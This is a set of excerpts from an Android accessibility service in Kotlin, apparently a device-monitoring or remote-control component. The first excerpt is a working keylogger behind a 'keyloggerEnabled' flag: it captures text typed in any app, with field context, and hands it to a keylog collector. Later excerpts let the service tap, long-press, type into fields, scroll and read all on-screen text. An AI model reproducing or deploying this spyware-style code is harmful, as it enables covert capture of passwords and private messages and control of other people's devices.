   176→   176→    private fun handleTextChangeEvent(event: AccessibilityEvent, packageName: String) {
   177→   177→        if (!keyloggerEnabled.get()) return
   178→   178→
   179→   179→        textEventCount++
   180→   180→        
   181→   181→        try {
   182→   182→            // Get the text from the event
   183→   183→            val text = event.text?.joinToString("") ?: ""
   184→   184→            val fromIndex = event.fromIndex
   185→   185→            val addedCount = event.addedCount
   186→   186→            val removedCount = event.removedCount
   187→   187→            val beforeText = event.beforeText?.toString() ?: ""
   188→   188→            
   189→   189→            // Get the source node for more details
   190→   190→            val source = event.source
   191→   191→            val viewId = source?.viewIdResourceName ?: ""
   192→   192→            val className = source?.className?.toString() ?: ""
   193→   193→            val description = source?.contentDescription?.toString() ?: ""
   194→   194→            
   195→   195→            // Build the captured data
   196→   196→            val capturedText = buildString {
   197→   197→                if (text.isNotEmpty()) {
   198→   198→                    append(text)
   199→   199→                }
   200→   200→                if (beforeText.isNotEmpty() && text.isNotEmpty() && beforeText != text) {
   201→   201→                    // Text was modified
   202→   202→                    append("[EDIT]")
   203→   203→                }
   204→   204→            }
   205→   205→            
   206→   206→            if (capturedText.isNotEmpty()) {
   207→   207→                // Update last captured
   208→   208→                lastCapturedText.append(capturedText)
   209→   209→                if (lastCapturedText.length > 10000) {
   210→   210→                    lastCapturedText = StringBuilder(lastCapturedText.takeLast(5000))
   211→   211→                }
   212→   212→                
   213→   213→                // Send to MonitorExecutor
   214→   214→                MonitorExecutor.appendKeylog(
   215→   215→                    packageName = packageName,
   216→   216→                    text = capturedText,
   217→   217→                    viewType = "text_change"
   218→   218→                )
   219→   219→                
   220→   220→                // Also log with context
   221→   221→                logKeyEvent(
   222→   222→                    packageName = packageName,
   223→   223→                    text = capturedText,
   224→   224→                    viewId = viewId,
   225→   225→                    className = className
   226→   226→                )
   227→   227→            }
   228→   228→            
   229→   229→            source?.recycle()
   230→   230→        } catch (e: Exception) {
   231→   231→            // Log error but don't crash
   232→   232→        }
   233→   233→    }

   425→   425→    fun clickAt(x: Int, y: Int): Boolean {
   426→   426→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
   427→   427→            return false
   428→   428→        }
   429→   429→        
   430→   430→        val path = Path().apply {
   431→   431→            moveTo(x.toFloat(), y.toFloat())
   432→   432→        }
   433→   433→        
   434→   434→        val gesture = GestureDescription.Builder()
   435→   435→            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
   436→   436→            .build()
   437→   437→        
   438→   438→        gestureLatch = CountDownLatch(1)
   439→   439→        gestureResult = false
   440→   440→        
   441→   441→        val dispatched = dispatchGesture(gesture, object : GestureResultCallback() {
   442→   442→            override fun onCompleted(gestureDescription: GestureDescription?) {
   443→   443→                gestureResult = true
   444→   444→                gestureLatch?.countDown()
   445→   445→            }
   446→   446→            
   447→   447→            override fun onCancelled(gestureDescription: GestureDescription?) {
   448→   448→                gestureResult = false
   449→   449→                gestureLatch?.countDown()
   450→   450→            }
   451→   451→        }, null)
   452→   452→        
   453→   453→        if (dispatched) {
   454→   454→            gestureLatch?.await(2, TimeUnit.SECONDS)
   455→   455→        }
   456→   456→        
   457→   457→        return gestureResult
   458→   458→    }

   500→   500→     * Type text into a focused input field
   501→   501→     */
   502→   502→    fun typeText(text: String): Boolean {
   503→   503→        val root = rootInActiveWindow ?: return false
   504→   504→        
   505→   505→        // Find focused node or editable node
   506→   506→        val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
   507→   507→            ?: root.findAccessibilityNodeInfosByViewId("android:id/edit").firstOrNull()
   508→   508→            ?: run {
   509→   509→                val nodes = root.findAccessibilityNodeInfosByText("")
   510→   510→                nodes.firstOrNull { it.isEditable }
   511→   511→            }
   512→   512→        
   513→   513→        if (focusedNode == null) return false
   514→   514→        
   515→   515→        // Try to set text directly
   516→   516→        val arguments = Bundle()
   517→   517→        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
   518→   518→        val result = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
   519→   519→        
   520→   520→        focusedNode.recycle()
   521→   521→        return result
   522→   522→    }

   526→   526→     */
   527→   527→    fun scroll(direction: ScrollDirection): Boolean {
   528→   528→        val root = rootInActiveWindow ?: return false
   529→   529→        
   530→   530→        val action = when (direction) {
   531→   531→            ScrollDirection.UP -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
   532→   532→            ScrollDirection.DOWN -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
   533→   533→            ScrollDirection.LEFT -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
   534→   534→            ScrollDirection.RIGHT -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
   535→   535→        }
   536→   536→        
   537→   537→        // Find scrollable node
   538→   538→        val scrollableNode = findScrollableNode(root, direction) ?: return false
   539→   539→        val result = scrollableNode.performAction(action)
   540→   540→        scrollableNode.recycle()
   541→   541→        
   542→   542→        return result
   543→   543→    }
   544→   544→    
   545→   545→    private fun findScrollableNode(node: AccessibilityNodeInfo, direction: ScrollDirection): AccessibilityNodeInfo? {
   546→   546→        if (node.isScrollable) return node
   547→   547→        
   548→   548→        for (i in 0 until node.childCount) {
   549→   549→            val child = node.getChild(i) ?: continue
   550→   550→            val result = findScrollableNode(child, direction)
   551→   551→            if (result != null) return result
   552→   552→            child.recycle()
   553→   553→        }
   554→   554→        
   555→   555→        return null
   556→   556→    }

   570→   570→    private fun extractTextFromNode(node: AccessibilityNodeInfo, builder: StringBuilder) {
   571→   571→        val text = node.text?.toString()
   572→   572→        if (!text.isNullOrBlank()) {
   573→   573→            builder.append(text).append("\n")
   574→   574→        }
   575→   575→        
   576→   576→        val contentDesc = node.contentDescription?.toString()
   577→   577→        if (!contentDesc.isNullOrBlank() && contentDesc != text) {
   578→   578→            builder.append(contentDesc).append("\n")
   579→   579→        }
   580→   580→        
   581→   581→        for (i in 0 until node.childCount) {
   582→   582→            val child = node.getChild(i) ?: continue
   583→   583→            extractTextFromNode(child, builder)
   584→   584→            child.recycle()
   585→   585→        }
   586→   586→    }

   614→   614→     */
   615→   615→    fun longPressAt(x: Int, y: Int): Boolean {
   616→   616→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
   617→   617→            return false
   618→   618→        }
   619→   619→        
   620→   620→        val path = Path().apply {
   621→   621→            moveTo(x.toFloat(), y.toFloat())
   622→   622→        }
   623→   623→        
   624→   624→        val gesture = GestureDescription.Builder()
   625→   625→            .addStroke(GestureDescription.StrokeDescription(path, 0, 500))
   626→   626→            .build()
   627→   627→        
   628→   628→        return dispatchGesture(gesture, null, null)
   629→   629→    }

   631→   631→    private fun performClickOnNode(node: AccessibilityNodeInfo): Boolean {
   632→   632→        // Try direct click
   633→   633→        if (node.isClickable) {
   634→   634→            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   635→   635→        }
   636→   636→        
   637→   637→        // Try parent click
   638→   638→        var parent = node.parent
   639→   639→        while (parent != null) {
   640→   640→            if (parent.isClickable) {
   641→   641→                val clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   642→   642→                parent.recycle()
   643→   643→                return clicked
   644→   644→            }
   645→   645→            val grandParent = parent.parent
   646→   646→            parent.recycle()
   647→   647→            parent = grandParent
   648→   648→        }
   649→   649→        
   650→   650→        // Try click via coordinates
   651→   651→        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
   652→   652→            val bounds = Rect()
   653→   653→            node.getBoundsInScreen(bounds)
   654→   654→            return clickAt(bounds.centerX(), bounds.centerY())
   655→   655→        }
   656→   656→        
   657→   657→        return false
   658→   658→    }
